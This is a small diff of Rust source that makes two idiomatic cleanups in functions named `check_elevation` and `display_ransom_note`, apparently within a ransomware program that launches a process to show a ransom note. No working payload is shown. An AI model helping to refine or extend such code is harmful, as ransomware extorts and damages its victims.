@@ -144,7 +144,7 @@ fn check_elevation() -> bool {
                 1,
             );
         }
-        return false;
+        false
     }
 }
 
@@ -287,7 +287,7 @@ fn display_ransom_note() -> bool {
         }
         command_line.push(32u8);
         for byte in full_path.as_bytes() {
-            command_line.push(byte.clone());
+            command_line.push(*byte);
         }
         command_line.push(0u8);
         CreateProcessA(
